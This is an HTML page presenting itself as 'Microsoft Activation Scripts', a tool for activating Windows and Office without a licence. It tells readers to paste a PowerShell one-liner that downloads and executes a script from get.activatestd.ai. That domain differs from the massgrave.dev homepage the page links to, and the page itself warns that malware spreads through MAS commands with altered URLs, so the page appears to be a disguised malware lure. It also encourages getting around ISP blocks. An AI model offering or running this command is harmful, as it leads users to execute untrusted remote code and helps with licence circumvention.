<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Microsoft Activation Scripts</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    /* Custom scrollbar for code blocks */
    ::-webkit-scrollbar {
      height: 8px;
      width: 8px;
    }

    ::-webkit-scrollbar-track {
      background: #1e293b;
    }

    ::-webkit-scrollbar-thumb {
      background: #3b82f6;
      border-radius: 4px;
    }

    ::-webkit-scrollbar-thumb:hover {
      background: #2563eb;
    }
  </style>
</head>

<body class="bg-gradient-to-tr from-gray-900 via-gray-800 to-gray-900 text-gray-300 min-h-screen flex flex-col justify-center items-center p-6 font-sans">

  <main
    class="max-w-3xl bg-gray-900/90 backdrop-blur-lg rounded-xl border border-gray-700 shadow-lg p-8 space-y-10 text-gray-200">

    <!-- Profile & Title -->
    <section class="flex flex-col items-center space-y-4 text-center">
      <div class="relative rounded-full w-36 h-36 overflow-hidden border-4 border-blue-600 shadow-md">
        <img src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/df87b480-299a-4136-a514-2fb9eded6d85.png"
          alt="Photo of a person taking a selfie in an elevator, wearing a hooded sweatshirt, slightly blurred background"
          class="object-cover w-full h-full" onerror="this.onerror=null;this.src='https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/2efd4148-2ce1-41a0-936e-08f11a19e9c4.png';" />
      </div>
      <h1 class="text-3xl font-semibold text-white drop-shadow-md">Microsoft Activation Scripts</h1>
      <p class="max-w-xl text-center text-gray-400 text-sm leading-relaxed">
        Open-source Windows and Office activator featuring HWID, O365K, Tilestring, KMS38, and Online KMS activation
        methods, along with advanced troubleshooting.
      </p>
    </section>

    <!-- How to Activate -->
    <section class="space-y-6">

      <h2 class="text-2xl font-semibold border-b border-blue-500 pb-2 mb-4">How to Activate Windows / Office / Extended
        Updates (ESU)?</h2>

      <!-- Method 1: Powershell -->
      <article class="space-y-4">
        <h3 class="text-xl font-bold text-blue-400 flex items-center space-x-2">
          <span>Method 1 - PowerShell</span>
          <span aria-label="heart" class="text-red-500">❤</span>
        </h3>
        <ol class="list-decimal list-inside space-y-3 text-gray-300">
          <li>
            <button id="open-powershell-btn"
              class="text-blue-400 hover:underline focus-visible:outline-none focus-visible:ring">
              Click the Start Menu, type <code class="bg-gray-700 px-1 rounded font-mono">powershell</code>, then open
              it.
            </button>
          </li>
          <li>
            Copy and paste the code below, then press enter:
            <div class="mt-2 bg-gray-800 rounded-md p-3 font-mono text-sm text-gray-100 overflow-x-auto">
              <strong>For Windows 8, 10, 11:</strong>
              <br />
              <code>iex (new-object net.webclient).downloadstring('https://get.activatestd.ai') | iex</code>
              <br /><br />
              <strong>For Windows 7 and later:</strong>
              <br />
              <code>iex (new-object net.webclient).downloadstring('https://get.activatestd.ai')</code>
            </div>
          </li>
          <li>
            Script not launching? <button id="info-link-btn"
              class="text-blue-400 hover:underline focus-visible:outline-none focus-visible:ring">
              Click here for info.
            </button>
          </li>
          <li>
            The activation menu will appear. Choose the green-highlighted options to activate Windows or Office.
          </li>
          <li>Done!</li>
        </ol>
      </article>

      <!-- Method 2: Traditional -->
      <article class="space-y-4">
        <h3 class="text-xl font-bold text-blue-400">Method 2 - Traditional (Windows Vista and later)</h3>
        <button id="traditional-view-btn"
          class="mt-1 inline-block rounded bg-blue-600 px-3 py-1 text-sm font-semibold text-gray-100 hover:bg-blue-700 focus-visible:outline-none focus-visible:ring">Click
          here to view</button>

        <!-- Initially hidden content for Method 2 -->
        <div id="traditional-instructions" class="mt-3 hidden space-y-4 bg-gray-800 rounded-md p-4 text-sm text-gray-300">
          <p><strong>Tip</strong></p>
          <ul class="list-disc list-inside space-y-2">
            <li>Some ISPs/DNS block access to our domains. You can bypass this by enabling <a
                href="https://dns-over-https.com/" target="_blank" rel="noopener noreferrer" class="underline hover:text-blue-400">DNS-over-HTTPS (DoH)</a>
              in your browser.</li>
            <li>Having trouble? Visit our <a href="https://github.com" target="_blank" rel="noopener noreferrer"
                class="underline hover:text-blue-400">troubleshooting page</a> or raise an issue on <a
                href="https://github.com" target="_blank" rel="noopener noreferrer" class="underline hover:text-blue-400">GitHub</a>.</li>
          </ul>
          <p><strong>Note</strong></p>
          <ul class="list-disc list-inside space-y-2">
            <li>To activate additional products such as Office for macOS, Visual Studio, RDS CALs, and Windows XP,
              check <a href="#" class="underline hover:text-blue-400">here</a>.</li>
            <li>To run the script in unattended mode, check <a href="#" class="underline hover:text-blue-400">here</a>.</li>
            <li>
              The IRM command in PowerShell downloads a script from a specified URL, and the EX command executes it.
            </li>
            <li>
              Always double-check the URL before executing the command and verify the source (manual downloading
              files).
            </li>
            <li>Be cautious, as some spread malware disguised as MAS by using different URLs in the IRM command.</li>
          </ul>
        </div>
      </article>

      <!-- Versions & Links -->
      <article class="space-y-4 text-sm text-gray-400 bg-gray-800 rounded-md p-4">
        <p><strong>Latest Version:</strong> 3.6</p>
        <p><strong>Release date:</strong> 18-Aug-2023</p>
      </article>

      <section class="flex flex-col gap-2 text-sm text-gray-400">
        <a href="#" class="underline hover:text-blue-400">Troubleshooting / Help</a>
        <a href="#" class="underline hover:text-blue-400">Download Original Windows & Office</a>
        <a href="https://massgrave.dev/" target="_blank" rel="noopener noreferrer" class="underline hover:text-blue-400">
          Homepage - https://massgrave.dev/
        </a>
      </section>

    </section>

    <!-- Social Handles -->
    <section aria-label="Social Media and Contact Links"
      class="flex justify-center space-x-6 pt-6 border-t border-gray-700 max-w-lg mx-auto">

      <a href="https://github.com" aria-label="GitHub" target="_blank" rel="noopener noreferrer"
        class="hover:text-blue-500 transition-colors" title="GitHub">
        <svg class="w-7 h-7 fill-current" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
          <path
            d="M12 2C6.48 2 2 6.58 2 12.16c0 4.51 2.87 8.34 6.84 9.69.5.09.68-.22.68-.48 0-.24-.01-.87-.01-1.71-2.78.61-3.37-1.39-3.37-1.39-.45-1.18-1.1-1.5-1.1-1.5-.9-.61.07-.6.07-.6 1 .07 1.52 1.04 1.52 1.04.89 1.56 2.34 1.1 2.9.85.09-.67.35-1.1.63-1.35-2.22-.26-4.55-1.11-4.55-4.94 0-1.09.39-1.98 1.03-2.67-.1-.25-.45-1.28.1-2.67 0 0 .84-.27 2.75 1.02a9.2 9.2 0 012.5-.35c.85.01 1.7.12 2.5.35 1.9-1.29 2.75-1.02 2.75-1.02.56 1.39.2 2.42.1 2.67.64.69 1.03 1.58 1.03 2.67 0 3.84-2.34 4.67-4.57 4.91.36.31.69.92.69 1.85 0 1.33-.01 2.4-.01 2.73 0 .27.18.58.69.48A10.22 10.22 0 0022 12.16C22 6.58 17.52 2 12 2z" />
        </svg>
      </a>

      <a href="https://twitter.com" aria-label="Twitter" target="_blank" rel="noopener noreferrer"
        class="hover:text-blue-400 transition-colors" title="Twitter">
        <svg class="w-7 h-7 fill-current" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
          <path
            d="M23 3a10.9 10.9 0 01-3.14.85 4.48 4.48 0 001.94-2.48 9.15 9.15 0 01-2.88 1.11 4.48 4.48 0 00-7.64 4.09A12.72 12.72 0 013 4.89s-4 9 5 13a13 13 0 01-8 2c11 7 22 0 22-13.5a4.5 4.5 0 00-.08-.83A9.22 9.22 0 0023 3z" />
        </svg>
      </a>

      <a href="https://discord.com" aria-label="Discord" target="_blank" rel="noopener noreferrer"
        class="hover:text-indigo-500 transition-colors" title="Discord">
        <svg class="w-7 h-7 fill-current" viewBox="0 0 71 55" aria-hidden="true" focusable="false">
          <path
            d="M60.104 4.552A58.053 58.053 0 0046.912.747a41.542 41.542 0 00-1.97 4.07 55.596 55.596 0 00-16.92 0 41.094 41.094 0 00-1.95-4.07 58.2 58.2 0 00-13.23 3.82C3.899 19.605 1.258 34.399 2.46 49.008a58.714 58.714 0 0018.03 5.81 39.12 39.12 0 003.14-5.115 33.53 33.53 0 01-5.92-9.04c9.87 7.17 20.68 7.17 30.3 0a33.891 33.891 0 01-6.01 9.04 39.225 39.225 0 003.2 5.11 58.564 58.564 0 0018.02-5.82c1.31-15.12-1.29-29.84-11.27-44.455zM23.16 37.65c-3.26 0-5.93-2.92-5.93-6.52 0-3.6 2.64-6.52 5.93-6.52 3.3 0 5.96 2.93 5.93 6.53 0 3.6-2.63 6.52-5.93 6.52zm24.68 0c-3.26 0-5.93-2.92-5.93-6.52 0-3.6 2.64-6.52 5.93-6.52 3.3 0 5.96 2.93 5.93 6.53 0 3.6-2.64 6.52-5.93 6.52z" />
        </svg>
      </a>

      <a href="https://youtube.com" aria-label="YouTube" target="_blank" rel="noopener noreferrer"
        class="hover:text-red-600 transition-colors" title="YouTube">
        <svg class="w-7 h-7 fill-current" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
          <path
            d="M22.54 6.42a2.76 2.76 0 00-1.93-2C18.75 3.87 12 3.87 12 3.87s-6.75 0-8.6.55a2.75 2.75 0 00-1.94 2c-.4 2.97-.4 5.83 0 8.79a2.76 2.76 0 001.93 2c1.86.55 8.61.55 8.61.55s6.75 0 8.6-.55a2.74 2.74 0 001.93-2c.41-2.97.41-5.83 0-8.79zm-14.37 6.15v-4.12l3.97 2.06-3.97 2.06z" />
        </svg>
      </a>

      <a href="https://x.com" aria-label="X" target="_blank" rel="noopener noreferrer"
        class="hover:text-sky-400 transition-colors" title="X">
        <svg class="w-7 h-7 fill-current" viewBox="0 0 24 24" aria-hidden="true" focusable="false">
          <path
            d="M21.5 3.5a1 1 0 00-1.414 0l-6.086 6.086-6.086-6.086a1 1 0 10-1.414 1.414l6.086 6.086-6.086 6.086a1 1 0 001.414 1.414l6.086-6.086 6.086 6.086a1 1 0 001.414-1.414l-6.086-6.086 6.086-6.086a1 1 0 000-1.414z" />
        </svg>
      </a>
    </section>

    <footer class="mt-10 text-center text-gray-400 text-sm select-none">
      Made with <span class="text-red-500 font-bold" aria-label="love heart">❤</span>
    </footer>

  </main>

  <script>
    // Open Start Menu > powershell simulation - just alert
    document.getElementById('open-powershell-btn').addEventListener('click', () => {
      alert("Simulate: Open Start Menu, type 'powershell', then open it.");
    });

    // Info Button for script not launching
    document.getElementById('info-link-btn').addEventListener('click', () => {
      alert("Script not launching? Please check your firewall or antivirus settings. Visit the official page for detailed troubleshooting.");
    });

    // Toggle traditional method instructions
    document.getElementById('traditional-view-btn').addEventListener('click', e => {
      const panel = document.getElementById('traditional-instructions');
      if (panel.classList.contains('hidden')) {
        panel.classList.remove('hidden');
        e.target.textContent = "Hide";
      } else {
        panel.classList.add('hidden');
        e.target.textContent = "Click here to view";
      }
    });
  </script>

</body>

</html>

